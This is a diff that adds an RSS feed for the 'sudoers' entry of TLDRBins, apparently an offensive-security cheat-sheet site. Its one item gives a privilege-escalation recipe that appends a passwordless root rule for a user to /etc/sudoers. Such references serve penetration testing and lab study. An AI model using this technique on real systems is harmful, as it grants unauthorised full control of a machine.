@@ -1,0 +1,18 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Sudoers on TLDRBins</title>
+    <link>https://tldrbins.github.io/@sudoers/</link>
+    <description>Recent content in Sudoers on TLDRBins</description>
+    <generator>Hugo</generator>
+    <language>en-us</language>
+    <atom:link href="https://tldrbins.github.io/@sudoers/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>sudoers</title>
+      <link>https://tldrbins.github.io/sudoers/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/sudoers/</guid>
+      <description> Privesc Abuse /etc/sudoers # IF you have control over `/etc/sudoers` chmod 600 /etc/sudoers echo &amp;#39;&amp;lt;USER&amp;gt; ALL=(ALL) NOPASSWD: ALL&amp;#39; &amp;gt;&amp;gt; /etc/sudoers chmod 440 /etc/sudoers </description>
+    </item>
+  </channel>
+</rss>
